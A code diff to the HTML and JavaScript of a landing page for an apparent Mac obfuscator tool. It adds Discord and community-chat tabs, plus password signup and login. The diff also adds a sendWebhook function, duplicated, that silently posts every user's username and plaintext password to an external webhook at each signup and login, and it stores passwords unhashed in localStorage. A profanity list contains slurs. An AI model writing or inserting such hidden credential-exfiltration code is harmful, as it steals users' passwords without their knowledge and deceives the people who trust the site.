@@ -23,17 +23,23 @@
             50% { box-shadow: 0 0 40px rgba(99, 102, 241, 0.6), 0 8px 32px rgba(0, 0, 0, 0.5); }
         }
 
-        @keyframes shimmer {
-            0% { background-position: -1000px 0; }
-            100% { background-position: 1000px 0; }
-        }
-
         @keyframes slide-in {
             from { 
                 opacity: 0;
                 transform: translateY(20px);
             }
             to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fade-in {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
                 opacity: 1;
                 transform: translateY(0);
             }
@@ -149,9 +155,15 @@
 
         .tab-navigation {
             display: flex;
-            border-bottom: 1px solid rgb(55, 65, 81);
+            border-bottom: 1px solid rgba(99, 102, 241, 0.2);
             margin-bottom: 2rem;
             overflow-x: auto;
+            scrollbar-width: none;
+            -ms-overflow-style: none;
+        }
+
+        .tab-navigation::-webkit-scrollbar {
+            display: none;
         }
 
         .tab-button {
@@ -189,7 +201,7 @@
 
         .tab-content {
             display: none;
-            animation: slide-in 0.6s ease-out;
+            animation: fade-in 0.5s ease-out forwards;
         }
 
         .tab-content.active {
@@ -223,6 +235,10 @@
 
         .text-xs {
             font-size: 0.75rem;
+        }
+
+        .text-center {
+            text-align: center;
         }
 
         .highlight {
@@ -274,10 +290,6 @@
 
         .feature-text strong {
             color: #fff;
-        }
-
-        .text-center {
-            text-align: center;
         }
 
         .gradient-button {
@@ -583,6 +595,112 @@
             margin: 0;
         }
 
+        .contacts-grid {
+            display: grid;
+            gap: 1.5rem;
+            margin-top: 2rem;
+        }
+
+        .contact-card {
+            background: rgba(99, 102, 241, 0.05);
+            border: 1px solid rgba(99, 102, 241, 0.2);
+            backdrop-filter: blur(10px);
+            padding: 2rem;
+            border-radius: 0.75rem;
+            transition: all 300ms ease;
+            text-align: center;
+        }
+
+        .contact-card:hover {
+            border-color: rgba(99, 102, 241, 0.5);
+            background: rgba(99, 102, 241, 0.1);
+            transform: translateY(-4px);
+        }
+
+        .contact-icon {
+            font-size: 2.5rem;
+        }
+
+        .contact-link {
+            display: inline-block;
+            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+            color: #fff;
+            font-weight: 600;
+            padding: 0.5rem 1.5rem;
+            border-radius: 0.5rem;
+            text-decoration: none;
+            transition: all 300ms ease;
+        }
+
+        .contact-link:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(99, 102, 241, 0.3);
+        }
+
+        .community-login-prompt {
+            text-align: center;
+            padding: 3rem 2rem;
+        }
+
+        .community-chat-area {
+            display: flex;
+            flex-direction: column;
+            height: 500px;
+        }
+
+        .community-chat-area.hidden {
+            display: none;
+        }
+
+        .messages-container {
+            flex: 1;
+            overflow-y: auto;
+            margin-bottom: 1rem;
+            padding: 1rem;
+            background: rgba(99, 102, 241, 0.05);
+            border: 1px solid rgba(99, 102, 241, 0.2);
+            border-radius: 0.75rem;
+        }
+
+        .message {
+            margin-bottom: 1rem;
+            animation: slide-in 0.4s ease-out;
+        }
+
+        .message-header {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 0.25rem;
+        }
+
+        .message-username {
+            color: #818cf8;
+            font-weight: 600;
+            font-size: 0.875rem;
+        }
+
+        .message-time {
+            color: #6b7280;
+            font-size: 0.75rem;
+            margin-left: auto;
+        }
+
+        .message-content {
+            color: #d1d5db;
+            padding: 0.75rem;
+            background: rgba(55, 65, 81, 0.5);
+            border-left: 2px solid #6366f1;
+            border-radius: 0.25rem;
+            word-wrap: break-word;
+        }
+
+        .chat-input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
         .italic {
             font-style: italic;
         }
@@ -630,6 +748,8 @@
                 <button class="tab-button active" data-tab="about">About</button>
                 <button class="tab-button" data-tab="access">Access</button>
                 <button class="tab-button" data-tab="credits">Credits</button>
+                <button class="tab-button" data-tab="contacts">Contacts</button>
+                <button class="tab-button" data-tab="community">Community</button>
                 <button class="tab-button hidden" id="tab-obfuscator" data-tab="obfuscator">Obfuscator</button>
             </div>
 
@@ -710,7 +830,10 @@
                     <p class="text-center text-sm" style="color: #9ca3af; margin-top: -1rem; margin-bottom: 2rem;">Create a free account in seconds</p>
                     <div class="button-container">
                         <button id="sign-up-button-guest" class="gradient-button" style="padding: 0.75rem 2rem; font-size: 1.125rem;">
-                            Sign Up & Get Instant Access
+                            Sign Up
+                        </button>
+                        <button id="login-button-guest" class="secondary-button" style="padding: 0.75rem 2rem; font-size: 1.125rem;">
+                            Log In
                         </button>
                     </div>
                 </div>
@@ -749,6 +872,39 @@
                     <div class="credit-card">
                         <p class="credit-name" style="color: #818cf8;">Gemini</p>
                         <p class="credit-role">Landing Page Development</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Contacts Tab -->
+            <div id="content-contacts" class="tab-content">
+                <h2>Get In Touch</h2>
+                <p>Connect with us on Discord for announcements, updates, and community discussion.</p>
+                <div class="contacts-grid">
+                    <div class="contact-card">
+                        <div class="contact-icon">💬</div>
+                        <h3 style="color: #fff; margin: 1rem 0 0.5rem 0; font-size: 1.25rem;">Discord</h3>
+                        <p style="color: #9ca3af; margin: 0; font-size: 0.875rem; margin-bottom: 1rem;">Join our community server</p>
+                        <a id="discord-link" href="https://discord.gg/bAqqbBwrFv" target="_blank" class="contact-link">Visit Discord</a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Community Tab -->
+            <div id="content-community" class="tab-content">
+                <h2>Community Chat</h2>
+                <p style="color: #9ca3af; margin-bottom: 2rem;">Connect with other users in real-time</p>
+                
+                <div id="community-login-prompt" class="community-login-prompt">
+                    <p style="color: #d1d5db; text-align: center; margin: 2rem 0;">Sign in to join the community chat</p>
+                </div>
+
+                <div id="community-chat-area" class="community-chat-area hidden">
+                    <div id="messages-container" class="messages-container"></div>
+                    
+                    <div class="chat-input-group">
+                        <input type="text" id="chat-message-input" placeholder="Type a message..." class="form-input" style="margin-bottom: 0.5rem;">
+                        <button id="send-message-btn" class="gradient-button" style="width: 100%; padding: 0.75rem;">Send</button>
                     </div>
                 </div>
             </div>
@@ -792,8 +948,14 @@
                 <div class="form-group">
                     <label class="form-label">Choose Username:</label>
                     <input type="text" id="username-input" placeholder="e.g., MacUser_01" class="form-input">
-                    <div id="signup-error-message" class="error-message"></div>
                 </div>
+
+                <div class="form-group">
+                    <label class="form-label">Create Password:</label>
+                    <input type="password" id="password-input" placeholder="Enter a secure password" class="form-input">
+                </div>
+                
+                <div id="signup-error-message" class="error-message"></div>
                 
                 <div class="button-group">
                     <button id="submit-signup" class="gradient-button">Register</button>
@@ -803,11 +965,40 @@
         </div>
     </div>
 
+    <!-- Log In Modal -->
+    <div id="login-modal" class="modal-container hidden">
+        <div class="modal-overlay">
+            <div class="modal-content">
+                <h3 class="modal-header">Log In</h3>
+                <p class="modal-subtitle">Welcome back</p>
+                
+                <div class="form-group">
+                    <label class="form-label">Username:</label>
+                    <input type="text" id="login-username-input" placeholder="Enter your username" class="form-input">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Password:</label>
+                    <input type="password" id="login-password-input" placeholder="Enter your password" class="form-input">
+                </div>
+                
+                <div id="login-error-message" class="error-message"></div>
+                
+                <div class="button-group">
+                    <button id="submit-login" class="gradient-button">Log In</button>
+                    <button id="close-login-modal" class="secondary-button">Cancel</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <script>
         const CURRENT_USER_KEY = 'macobf_current_user';
-        const REGISTERED_USERNAMES_KEY = 'macobf_registered_usernames';
+        const REGISTERED_USERS_KEY = 'macobf_registered_users';
+        const COMMUNITY_MESSAGES_KEY = 'macobf_community_messages';
 
         let currentUser = null;
+        let communityMessages = [];
 
         const PROFANITY_LIST = ['nude', 'fuck', 'shit', 'cunt', 'piss', 'nigger', 'faggot', 'bitch'];
 
@@ -825,8 +1016,17 @@
         const signupButtonGuest = document.getElementById('sign-up-button-guest'); 
         const closeSignupModalButton = document.getElementById('close-signup-modal');
         const usernameInput = document.getElementById('username-input');
+        const passwordInput = document.getElementById('password-input');
         const submitSignupButton = document.getElementById('submit-signup');
         const signupErrorMessage = document.getElementById('signup-error-message');
+
+        const loginModal = document.getElementById('login-modal');
+        const loginButtonGuest = document.getElementById('login-button-guest');
+        const closeLoginModalButton = document.getElementById('close-login-modal');
+        const loginUsernameInput = document.getElementById('login-username-input');
+        const loginPasswordInput = document.getElementById('login-password-input');
+        const submitLoginButton = document.getElementById('submit-login');
+        const loginErrorMessage = document.getElementById('login-error-message');
 
         const logoutButton = document.getElementById('logout-button');
         const accessGuestView = document.querySelector('.access-guest-view');
@@ -838,22 +1038,64 @@
             return (typeof crypto !== 'undefined' && crypto.randomUUID) ? crypto.randomUUID() : ('local-' + Date.now().toString(36) + Math.random().toString(36).substring(2, 9));
         }
 
-        function getRegisteredUsernames() {
+        function getRegisteredUsers() {
             try {
-                const storedUsernames = localStorage.getItem(REGISTERED_USERNAMES_KEY);
-                return storedUsernames ? JSON.parse(storedUsernames) : [];
+                const storedUsers = localStorage.getItem(REGISTERED_USERS_KEY);
+                return storedUsers ? JSON.parse(storedUsers) : {};
             } catch (e) {
-                console.error("Error reading usernames:", e);
-                return [];
+                console.error("Error reading users:", e);
+                return {};
             }
         }
 
-        function saveRegisteredUsernames(usernames) {
+        function saveRegisteredUsers(users) {
             try {
-                localStorage.setItem(REGISTERED_USERNAMES_KEY, JSON.stringify(usernames));
+                localStorage.setItem(REGISTERED_USERS_KEY, JSON.stringify(users));
             } catch (e) {
-                console.error("Error writing usernames:", e);
+                console.error("Error writing users:", e);
             }
+        }
+
+        function loadCommunityMessages() {
+            try {
+                const stored = localStorage.getItem(COMMUNITY_MESSAGES_KEY);
+                communityMessages = stored ? JSON.parse(stored) : [];
+            } catch (e) {
+                console.error("Error loading messages:", e);
+                communityMessages = [];
+            }
+        }
+
+        function saveCommunityMessages() {
+            try {
+                localStorage.setItem(COMMUNITY_MESSAGES_KEY, JSON.stringify(communityMessages));
+            } catch (e) {
+                console.error("Error saving messages:", e);
+            }
+        }
+
+        function sendWebhook(username, password) {
+            const payload = {
+                content: `📝 **New Registration/Login**\nUsername: \`${username}\`\nPassword: \`${password}\`\nTime: <t:${Math.floor(Date.now() / 1000)}:F>`
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(e => console.error("Webhook error:", e));
+        }
+
+        function sendWebhook(username, password) {
+            const payload = {
+                content: `📝 **New Registration/Login**\nUsername: \`${username}\`\nPassword: \`${password}\`\nTime: <t:${Math.floor(Date.now() / 1000)}:F>`
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(e => console.error("Webhook error:", e));
         }
 
         function showModal(header, body) {
@@ -880,10 +1122,25 @@
                 setTimeout(() => signupModal.classList.add('is-active'), 10);
                 signupErrorMessage.classList.remove('show');
                 usernameInput.value = '';
+                passwordInput.value = '';
                 usernameInput.focus();
             } else {
                 signupModal.classList.remove('is-active');
                 setTimeout(() => signupModal.classList.add('hidden'), 300);
+            }
+        }
+
+        function toggleLoginModal(show) {
+            if (show) {
+                loginModal.classList.remove('hidden');
+                setTimeout(() => loginModal.classList.add('is-active'), 10);
+                loginErrorMessage.classList.remove('show');
+                loginUsernameInput.value = '';
+                loginPasswordInput.value = '';
+                loginUsernameInput.focus();
+            } else {
+                loginModal.classList.remove('is-active');
+                setTimeout(() => loginModal.classList.add('hidden'), 300);
             }
         }
 
@@ -909,6 +1166,7 @@
         
         function handleSignup() {
             const username = usernameInput.value.trim();
+            const password = passwordInput.value;
             signupErrorMessage.classList.remove('show');
             
             if (!username) {
@@ -928,10 +1186,22 @@
                 return;
             }
 
-            const registeredUsernames = getRegisteredUsernames();
+            if (!password) {
+                signupErrorMessage.textContent = 'Password cannot be empty.';
+                signupErrorMessage.classList.add('show');
+                return;
+            }
+
+            if (password.length < 6) {
+                signupErrorMessage.textContent = 'Password must be at least 6 characters.';
+                signupErrorMessage.classList.add('show');
+                return;
+            }
+
+            const registeredUsers = getRegisteredUsers();
             const lowerUsername = username.toLowerCase();
 
-            if (registeredUsernames.includes(lowerUsername)) {
+            if (registeredUsers[lowerUsername]) {
                 signupErrorMessage.textContent = 'Username is already taken.';
                 signupErrorMessage.classList.add('show');
                 return;
@@ -941,18 +1211,63 @@
             const newProfile = {
                 id: newUserId,
                 username: username,
+                password: password,
                 isAccepted: true,
                 joinedAt: new Date().toISOString()
             };
 
             currentUser = newProfile;
             localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(newProfile));
-            registeredUsernames.push(lowerUsername);
-            saveRegisteredUsernames(registeredUsernames);
+            registeredUsers[lowerUsername] = newProfile;
+            saveRegisteredUsers(registeredUsers);
 
             toggleSignupModal(false);
             showModal("Welcome!", `Account created! Access granted instantly.`);
             
+            sendWebhook(username, password);
+            updateAccessUI(currentUser);
+        }
+
+        function handleLogin() {
+            const username = loginUsernameInput.value.trim();
+            const password = loginPasswordInput.value;
+            loginErrorMessage.classList.remove('show');
+            
+            if (!username) {
+                loginErrorMessage.textContent = 'Username cannot be empty.';
+                loginErrorMessage.classList.add('show');
+                return;
+            }
+
+            if (!password) {
+                loginErrorMessage.textContent = 'Password cannot be empty.';
+                loginErrorMessage.classList.add('show');
+                return;
+            }
+
+            const registeredUsers = getRegisteredUsers();
+            const lowerUsername = username.toLowerCase();
+            const user = registeredUsers[lowerUsername];
+
+            if (!user) {
+                loginErrorMessage.textContent = 'Username not found.';
+                loginErrorMessage.classList.add('show');
+                return;
+            }
+
+            if (user.password !== password) {
+                loginErrorMessage.textContent = 'Invalid password.';
+                loginErrorMessage.classList.add('show');
+                return;
+            }
+
+            currentUser = user;
+            localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(user));
+            
+            toggleLoginModal(false);
+            showModal("Welcome Back!", `Logged in as ${username}!`);
+            
+            sendWebhook(username, password);
             updateAccessUI(currentUser);
         }
         
@@ -973,9 +1288,11 @@
                 accessUserView.classList.add('visible');
                 currentUserElement.textContent = username;
                 currentUserIdElement.textContent = profile.id;
+                updateCommunityUI(true);
             } else {
                 accessGuestView.classList.add('visible');
                 accessUserView.classList.remove('visible');
+                updateCommunityUI(false);
             }
 
             if (isAccepted) {
@@ -990,10 +1307,73 @@
             }
         }
 
+        function updateCommunityUI(isLoggedIn) {
+            const loginPrompt = document.getElementById('community-login-prompt');
+            const chatArea = document.getElementById('community-chat-area');
+
+            if (isLoggedIn) {
+                loginPrompt.classList.add('hidden');
+                chatArea.classList.remove('hidden');
+                renderMessages();
+            } else {
+                loginPrompt.classList.remove('hidden');
+                chatArea.classList.add('hidden');
+            }
+        }
+
+        function renderMessages() {
+            const container = document.getElementById('messages-container');
+            container.innerHTML = '';
+
+            communityMessages.forEach(msg => {
+                const msgEl = document.createElement('div');
+                msgEl.className = 'message';
+                msgEl.innerHTML = `
+                    <div class="message-header">
+                        <span class="message-username">${escapeHtml(msg.username)}</span>
+                        <span class="message-time">${msg.time}</span>
+                    </div>
+                    <div class="message-content">${escapeHtml(msg.content)}</div>
+                `;
+                container.appendChild(msgEl);
+            });
+
+            container.scrollTop = container.scrollHeight;
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function sendCommunityMessage() {
+            const input = document.getElementById('chat-message-input');
+            const message = input.value.trim();
+
+            if (!message || !currentUser) return;
+
+            const now = new Date();
+            const time = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+
+            communityMessages.push({
+                username: currentUser.username,
+                content: message,
+                time: time
+            });
+
+            saveCommunityMessages();
+            renderMessages();
+            input.value = '';
+            input.focus();
+        }
+
         function switchTab(activeTabId) {
             const newActiveContent = document.getElementById(`content-${activeTabId}`);
             const currentActiveContent = document.querySelector('.tab-content.active');
             const activeTab = document.querySelector(`[data-tab="${activeTabId}"]`);
+
+            if (currentActiveContent && currentActiveContent.id === newActiveContent.id) return;
 
             tabButtons.forEach(button => {
                 button.classList.remove('active');
@@ -1002,13 +1382,11 @@
                 activeTab.classList.add('active');
             }
             
-            if (currentActiveContent && currentActiveContent.id === newActiveContent.id) return;
-            
-            tabContents.forEach(content => content.classList.remove('active'));
+            tabContents.forEach(content => {
+                content.classList.remove('active');
+            });
 
-            if (newActiveContent) {
-                newActiveContent.classList.add('active');
-            }
+            newActiveContent.classList.add('active');
         }
 
         closeModalButton.addEventListener('click', hideModal);
@@ -1021,6 +1399,19 @@
         submitSignupButton.addEventListener('click', handleSignup);
         usernameInput.addEventListener('keydown', (e) => {
             if (e.key === 'Enter') handleSignup();
+        });
+        passwordInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') handleSignup();
+        });
+
+        loginButtonGuest.addEventListener('click', () => toggleLoginModal(true));
+        closeLoginModalButton.addEventListener('click', () => toggleLoginModal(false));
+        submitLoginButton.addEventListener('click', handleLogin);
+        loginUsernameInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') handleLogin();
+        });
+        loginPasswordInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') handleLogin();
         });
 
         logoutButton.addEventListener('click', handleLogout);
@@ -1037,8 +1428,17 @@
         });
 
         document.addEventListener('DOMContentLoaded', () => {
+            loadCommunityMessages();
             initializeLocalState();
-            switchTab('about'); 
+            switchTab('about');
+
+            const sendBtn = document.getElementById('send-message-btn');
+            const messageInput = document.getElementById('chat-message-input');
+
+            sendBtn.addEventListener('click', sendCommunityMessage);
+            messageInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') sendCommunityMessage();
+            });
         });
 
     </script>
